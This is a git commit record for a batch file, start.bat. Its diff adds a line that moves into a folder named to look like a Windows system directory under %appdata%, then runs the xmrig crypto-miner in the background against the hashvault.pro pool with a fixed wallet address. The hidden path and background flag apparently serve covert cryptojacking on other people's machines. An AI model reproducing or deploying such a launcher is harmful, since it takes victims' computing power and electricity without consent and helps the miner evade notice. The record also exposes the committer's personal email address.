3c5bee1c1abd8323d30b056387fe7fabd1c18ac7
johan <ali.slm.1331@gmail.com>
2022-01-22 04:07:57 +0330

    Update start.bat

--- x/start.bat
+++ x/start.bat
@@ -1,1 +1,2 @@
+cd %appdata%\Microsoft\Windows\temp\x
 xmrig.exe --donate-level 1 -o pool.hashvault.pro:80 -u 88yT7x4S3Txcs62YLQrVNFdPVxgFsLTyNUBwJVgoLAMpJyfzCmMrqMDaC37WTuoUsWjZLC1jGn5LF9PVemiReGVMAi2Hg4x -p 2 -B
